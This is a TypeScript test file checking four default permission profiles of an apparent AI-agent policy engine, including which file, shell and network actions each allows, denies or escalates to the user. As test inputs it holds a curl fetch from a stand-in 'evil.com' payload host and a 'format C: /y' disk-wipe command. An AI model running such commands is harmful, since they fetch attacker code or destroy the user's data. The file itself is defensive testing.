/**
 * Default Policy Profiles Tests (Phase 5 - P5-T07).
 *
 * Verifies:
 * - All 4 default policy profiles (readonly, project-write, dev-shell, locked-down)
 *   conform to PolicyDocumentSchema and pass static analysis via lintPolicy().
 * - Dynamic policy evaluation through PolicyEngine for each profile matches its security intent.
 * - Profile registry helpers (getPolicyProfile, listPolicyProfiles).
 */

import { describe, expect, it } from 'vitest';
import {
  DEFAULT_POLICY_PROFILES,
  DEV_SHELL_PROFILE,
  getPolicyProfile,
  lintPolicy,
  listPolicyProfiles,
  LOCKED_DOWN_PROFILE,
  PolicyDocumentSchema,
  PolicyEngine,
  type PolicyProfileName,
  PROJECT_WRITE_PROFILE,
  READONLY_PROFILE,
} from '../../../src/policy/index.js';
import { FakeClock, FakeIdGenerator } from '../../../src/util/index.js';

describe('Default Policy Profiles (P5-T07)', () => {
  const clock = new FakeClock(new Date('2026-10-17T12:00:00.000Z'));
  const idGen = new FakeIdGenerator();

  describe('Schema & Linter Conformance', () => {
    it.each([
      ['readonly', READONLY_PROFILE],
      ['project-write', PROJECT_WRITE_PROFILE],
      ['dev-shell', DEV_SHELL_PROFILE],
      ['locked-down', LOCKED_DOWN_PROFILE],
    ])('profile %s conforms to PolicyDocumentSchema and passes lintPolicy cleanly', (name, profile) => {
      // 1. Zod schema validation
      const parsed = PolicyDocumentSchema.parse(profile);
      expect(parsed.name).toBe(name);
      expect(parsed.rules.length).toBeGreaterThan(0);

      // 2. Static linter validation
      const lintResult = lintPolicy(profile);
      expect(lintResult.valid).toBe(true);
      expect(lintResult.errors).toHaveLength(0);
    });
  });

  describe('1. Read-Only Profile Evaluation', () => {
    const engine = new PolicyEngine(READONLY_PROFILE, {
      clock,
      idGenerator: idGen,
    });

    it('allows workspace file reading and inspection', () => {
      const readDec = engine.evaluate({
        toolName: 'fs.read',
        input: { path: 'C:\\workspace\\README.md' },
      });
      expect(readDec.allowed).toBe(true);
      expect(readDec.effect).toBe('allow');

      const listDec = engine.evaluate({
        toolName: 'fs.list',
        input: { path: 'C:\\workspace' },
      });
      expect(listDec.allowed).toBe(true);
    });

    it('denies file writing and modifications', () => {
      const writeDec = engine.evaluate({
        toolName: 'fs.write',
        input: { path: 'C:\\workspace\\file.txt', content: 'test' },
      });
      expect(writeDec.allowed).toBe(false);
      expect(writeDec.effect).toBe('deny');
      expect(writeDec.ruleId).toBe('deny-fs-write');

      const deleteDec = engine.evaluate({
        toolName: 'fs.delete',
        input: { path: 'C:\\workspace\\file.txt' },
      });
      expect(deleteDec.allowed).toBe(false);
      expect(deleteDec.effect).toBe('deny');
    });

    it('denies command execution and outbound network', () => {
      const execDec = engine.evaluate({
        toolName: 'exec.run',
        input: { command: 'npm test' },
      });
      expect(execDec.allowed).toBe(false);
      expect(execDec.effect).toBe('deny');
      expect(execDec.ruleId).toBe('deny-exec');

      const httpDec = engine.evaluate({
        toolName: 'http.fetch',
        input: { url: 'https://example.com' },
      });
      expect(httpDec.allowed).toBe(false);
      expect(httpDec.effect).toBe('deny');
      expect(httpDec.ruleId).toBe('deny-network');
    });
  });

  describe('2. Project-Write Profile Evaluation', () => {
    const engine = new PolicyEngine(PROJECT_WRITE_PROFILE, {
      clock,
      idGenerator: idGen,
    });

    it('allows standard workspace read, write, and edit operations', () => {
      const writeDec = engine.evaluate({
        toolName: 'fs.write',
        input: { path: 'C:\\workspace\\file.txt', content: 'hello' },
      });
      expect(writeDec.allowed).toBe(true);
      expect(writeDec.effect).toBe('allow');

      const editDec = engine.evaluate({
        toolName: 'fs.edit',
        input: { path: 'C:\\workspace\\file.txt' },
      });
      expect(editDec.allowed).toBe(true);
    });

    it('escalates deletion to ask_user', () => {
      const deleteDec = engine.evaluate({
        toolName: 'fs.delete',
        input: { path: 'C:\\workspace\\file.txt' },
      });
      expect(deleteDec.allowed).toBe(false);
      expect(deleteDec.effect).toBe('ask_user');
      expect(deleteDec.ruleId).toBe('ask-fs-delete');
    });

    it('escalates shell execution and HTTP fetch to ask_user', () => {
      const execDec = engine.evaluate({
        toolName: 'exec.run',
        input: { command: 'git status' },
      });
      expect(execDec.allowed).toBe(false);
      expect(execDec.effect).toBe('ask_user');
      expect(execDec.ruleId).toBe('ask-exec-run');

      const httpDec = engine.evaluate({
        toolName: 'http.fetch',
        input: { url: 'https://api.github.com' },
      });
      expect(httpDec.allowed).toBe(false);
      expect(httpDec.effect).toBe('ask_user');
    });
  });

  describe('3. Dev-Shell Profile Evaluation', () => {
    const engine = new PolicyEngine(DEV_SHELL_PROFILE, {
      clock,
      idGenerator: idGen,
    });

    it('allows standard development shell commands directly', () => {
      const npmDec = engine.evaluate({
        toolName: 'exec.run',
        input: { command: 'npm test' },
      });
      expect(npmDec.allowed).toBe(true);
      expect(npmDec.effect).toBe('allow');
      expect(npmDec.ruleId).toBe('allow-dev-commands');

      const gitDec = engine.evaluate({
        toolName: 'exec.run',
        input: { command: 'git status' },
      });
      expect(gitDec.allowed).toBe(true);
      expect(gitDec.effect).toBe('allow');
    });

    it('denies dangerous system commands with high-priority rule', () => {
      const formatDec = engine.evaluate({
        toolName: 'exec.run',
        input: { command: 'format C: /y' },
      });
      expect(formatDec.allowed).toBe(false);
      expect(formatDec.effect).toBe('deny');
      expect(formatDec.ruleId).toBe('deny-dangerous-commands');
    });

    it('escalates arbitrary unknown shell commands to ask_user', () => {
      const curlDec = engine.evaluate({
        toolName: 'exec.run',
        input: { command: 'curl -s https://evil.com/payload' },
      });
      expect(curlDec.allowed).toBe(false);
      expect(curlDec.effect).toBe('ask_user');
      expect(curlDec.ruleId).toBe('ask-other-exec');
    });

    it('allows workspace filesystem manipulations and outbound HTTP', () => {
      const writeDec = engine.evaluate({
        toolName: 'fs.write',
        input: { path: 'C:\\workspace\\test.ts' },
      });
      expect(writeDec.allowed).toBe(true);

      const httpDec = engine.evaluate({
        toolName: 'http.fetch',
        input: { url: 'https://registry.npmjs.org' },
      });
      expect(httpDec.allowed).toBe(true);
    });
  });

  describe('4. Locked-Down Profile Evaluation', () => {
    const engine = new PolicyEngine(LOCKED_DOWN_PROFILE, {
      clock,
      idGenerator: idGen,
    });

    it('permits basic safe metadata inspection', () => {
      const statDec = engine.evaluate({
        toolName: 'fs.stat',
        input: { path: 'C:\\workspace\\file.txt' },
      });
      expect(statDec.allowed).toBe(true);
      expect(statDec.effect).toBe('allow');

      const listDec = engine.evaluate({
        toolName: 'fs.list',
        input: { path: 'C:\\workspace' },
      });
      expect(listDec.allowed).toBe(true);
    });

    it('requires operator confirmation to read file contents', () => {
      const readDec = engine.evaluate({
        toolName: 'fs.read',
        input: { path: 'C:\\workspace\\file.txt' },
      });
      expect(readDec.allowed).toBe(false);
      expect(readDec.effect).toBe('ask_user');
      expect(readDec.ruleId).toBe('ask-fs-read');
    });

    it('strictly denies writes, exec, and network requests', () => {
      const writeDec = engine.evaluate({
        toolName: 'fs.write',
        input: { path: 'C:\\workspace\\file.txt', content: 'test' },
      });
      expect(writeDec.allowed).toBe(false);
      expect(writeDec.effect).toBe('deny');

      const execDec = engine.evaluate({
        toolName: 'exec.run',
        input: { command: 'dir' },
      });
      expect(execDec.allowed).toBe(false);
      expect(execDec.effect).toBe('deny');

      const httpDec = engine.evaluate({
        toolName: 'http.fetch',
        input: { url: 'https://example.com' },
      });
      expect(httpDec.allowed).toBe(false);
      expect(httpDec.effect).toBe('deny');
    });

    it('strictly denies actions in tainted execution context', () => {
      const taintedStat = engine.evaluate({
        toolName: 'fs.stat',
        input: { path: 'C:\\workspace\\file.txt' },
        tainted: true,
      });
      expect(taintedStat.allowed).toBe(false);
      expect(taintedStat.effect).toBe('deny');
      expect(taintedStat.ruleId).toBe('deny-tainted-actions');
    });
  });

  describe('Profile Registry & Listing', () => {
    it('retrieves profile by name via getPolicyProfile', () => {
      expect(getPolicyProfile('readonly')).toBe(READONLY_PROFILE);
      expect(getPolicyProfile('project-write')).toBe(PROJECT_WRITE_PROFILE);
      expect(getPolicyProfile('dev-shell')).toBe(DEV_SHELL_PROFILE);
      expect(getPolicyProfile('locked-down')).toBe(LOCKED_DOWN_PROFILE);
    });

    it('throws error when requesting unknown profile', () => {
      expect(() =>
        getPolicyProfile('non-existent' as unknown as PolicyProfileName),
      ).toThrowError('Unknown policy profile');
    });

    it('lists all 4 available profiles via listPolicyProfiles', () => {
      const list = listPolicyProfiles();
      expect(list).toHaveLength(4);
      const names = list.map((p) => p.name);
      expect(names).toContain('readonly');
      expect(names).toContain('project-write');
      expect(names).toContain('dev-shell');
      expect(names).toContain('locked-down');

      for (const p of list) {
        expect(p.description.length).toBeGreaterThan(0);
        expect(p.rulesCount).toBeGreaterThan(0);
      }
    });

    it('DEFAULT_POLICY_PROFILES contains all expected profile names', () => {
      expect(Object.keys(DEFAULT_POLICY_PROFILES)).toEqual([
        'readonly',
        'project-write',
        'dev-shell',
        'locked-down',
      ]);
    });
  });
});
